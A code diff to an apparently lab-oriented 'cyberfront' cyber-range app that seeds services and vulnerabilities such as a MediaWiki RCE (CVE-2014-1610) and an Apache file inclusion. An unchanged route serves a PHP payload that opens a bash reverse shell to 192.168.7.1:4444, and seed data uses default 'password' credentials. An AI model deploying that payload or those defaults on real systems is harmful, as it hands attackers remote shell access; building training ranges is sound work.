@@ -117,6 +117,7 @@ def add_host_to_world(world, hostname, os_id):
 def get_hosts_in_world(world):
     return util.pretty_json(Host.objects(world=world))
 
+
 @route('/api/hosts')
 def get_all_hosts():
     return util.pretty_json(Host.objects())
@@ -178,15 +179,13 @@ def get_vulns():
 def rfi():
     return '<?php echo hello; echo shell_exec(\'bash -c "bash -i >& /dev/tcp/192.168.7.1/4444 0>&1"\');?>'
 
-print "cyberfront starting"
+print "cyberfront setup starting"
 
-# ubuntu = OperatingSystem(kernel='LINUX', name='Ubuntu', version='14.04', box='ubuntu/trusty64')
-# ubuntu.save()
+if OperatingSystem.objects(name='Ubuntu', version='14.04').first() is None:
+    ubuntu = OperatingSystem(kernel='LINUX', name='Ubuntu', version='14.04', box='ubuntu/trusty64')
+    ubuntu.save()
 
-# bob = Account(name='bob', password='password', group='root')
-# testmachine = Host.objects().first()
-
-if len(Service.objects()) == 0:
+if Service.objects(name='apache_ubuntu').first() is None:
     options = {
         'user': ConfigurationOption(name='Run As User', description='User to run the service as.', type='USER'),
         'port': ConfigurationOption(name='Port', description='Port to listen on.', type='INT'),
@@ -196,7 +195,19 @@ if len(Service.objects()) == 0:
     apache2 = Service(name='apache_ubuntu', full_name='Apache Web Server', version='2', options=options)
     apache2.save()
 
-if len(Service.objects()) == 3:
+if Service.objects(name='sudo_ubuntu').first() is None:
+    sudo_options = {
+        'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
+    }
+    sudo = Service(name='ubuntu_sudo', service_name='sudo', version='?', options=sudo_options)
+    sudo.save()
+
+    sudo = Service.objects(name="ubuntu_sudo").first()
+    ubuntu = OperatingSystem.objects(name='Ubuntu').first()
+    ubuntu.services = [sudo]
+    ubuntu.save()
+
+if Service.objects(name='mysql_ubuntu').first() is None:
     options = {
         'user': ConfigurationOption(name='Run As User', description='User to run the service as.', type='USER'),
         'port': ConfigurationOption(name='Port', description='Port to listen on.', type='INT', default='3306'),
@@ -210,7 +221,26 @@ if len(Service.objects()) == 3:
     mysql.vulnerabilities = [local]
     mysql.save()
 
-if len(Vulnerability.objects()) == 0:
+if Service.objects(name='mediawiki_ubuntu').first() is None:
+    options = {
+        'admin_username': ConfigurationOption(name='Wiki Admin Account Name', default='admin'),
+        'admin_password': ConfigurationOption(name='Wiki Admin Account Password', default='password'),
+        'db_username': ConfigurationOption(name='Wiki Database User', default='wikiuser'),
+        'db_password': ConfigurationOption(name='Wiki Database Password', default=''),
+        'host_directory': ConfigurationOption(name='Wiki install location'),
+        'database': ConfigurationOption(name='Database', type='SERVICE'),
+        'webserver': ConfigurationOption(name='Web Server', type='SERVICE')
+    }
+    mw = Service(name='mediawiki_ubuntu', full_name='MediaWiki', version='1.22.1', options=options)
+    mw.save()
+
+if Vulnerability.objects(name='rce_mediawiki').first() is None:
+    v = Vulnerability(name='rce_mediawiki', full_name='thumb.php Remote Command Execution', cve="CVE-2014-1610",
+                      category='Remote Code Execution', options={})
+    v.save()
+
+
+if Vulnerability.objects(name='rfi_apache') is None:
     options = {
         'file': ConfigurationOption(name='Vulnerable File', description='File that is affected by the vulnerability',
                                     type='FILE'),
@@ -221,25 +251,8 @@ if len(Vulnerability.objects()) == 0:
                         category='File Inclusion', requirements=['apache_ubuntu'], options=options)
     rfi.save()
 
-# sudo_options = {
-#    'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
-# }
-# sudo = Service(name='ubuntu_sudo', service_name='sudo', version='?', options=sudo_options)
-# sudo.save()
-
-# sudo = Service.objects(name="ubuntu_sudo").first()
-# ubuntu = OperatingSystem.objects().first()
-# ubuntu.services = [sudo]
-# ubuntu.save()
-
-# World(name='world1').save()
-# World(name='world2').save()
-
-# apache2 = Service.objects(service_name='Apache Web Server').first()
-# apache2.install(testmachine, user='bob', group='bob', port='1234', php="1", files='web.tar.gz')
-# testmachine = Host(hostname='test', os=ubuntu, accounts=[bob])
-# testmachine.save()
+print "cyberfront starting"
 
 app.run(port=80, host='192.168.7.1')
- # app.run(port=80)
+# app.run(port=80)
 
